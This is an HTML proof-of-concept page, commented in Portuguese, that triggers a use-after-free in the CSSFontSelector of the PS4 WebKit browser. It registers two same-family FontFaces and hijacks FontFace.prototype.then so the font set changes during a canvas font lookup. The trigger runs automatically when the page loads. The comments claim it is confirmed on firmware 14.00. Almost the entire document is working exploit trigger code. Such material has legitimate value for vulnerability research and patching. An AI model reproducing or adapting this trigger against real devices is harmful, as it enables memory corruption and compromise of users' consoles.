<!DOCTYPE html>
<!--
  UAF: CSSFontSelector via ctx.font setter + document.fonts.add()
       Variante com 2 faces da mesma familia (como UAF_CSSFontSelector)
  ================================================================
  Bug class  : Use-After-Free (CWE-416)
  Target     : PS4 libSceNKWebKit.sprx / AppleWebKit 605.1.15
  Trigger    : ctx.font = 'size FontName'
  Victim C++ : CSSFontSelector — iterador invalido com 2 faces
               da mesma familia forcando code path especifico

  DIFERENCA DO POC-A:
  -------------------
  Duas faces com o MESMO nome de familia (T) sao adicionadas ao
  document.fonts. Isso forca CSSFontSelector a iterar multiplas
  entradas para a mesma familia, aumentando a janela de corrupcao
  quando fonts.add() muta a colecao durante a iteracao.
  Mesmo padrao do UAF_CSSFontSelector.html confirmado pela Sony,
  com trigger ctx.font em vez de ctx.measureText().

  CONFIRMADO: PS4 FW 14.00 — secao C V1 do diagnostico v4
-->
<html>
<body>
<script>
function trigger() {
    var face1 = new FontFace('T', 'local(Helvetica)');
    var face2 = new FontFace('T', 'local(Helvetica)');
    document.fonts.add(face1);
    document.fonts.add(face2);
    void face1.loaded;
    void face2.loaded;

    var fired = false;
    Object.defineProperty(FontFace.prototype, 'then', {
        configurable: true,
        get: function() {
            if (fired) return undefined;
            fired = true;
            document.fonts.add(new FontFace('U', 'local(Helvetica)'));
            return undefined;
        }
    });

    var c = document.createElement('canvas');
    c.getContext('2d').font = '10px T';
}

window.onload = function() { setTimeout(trigger, 0); };
</script>
</body>
</html>
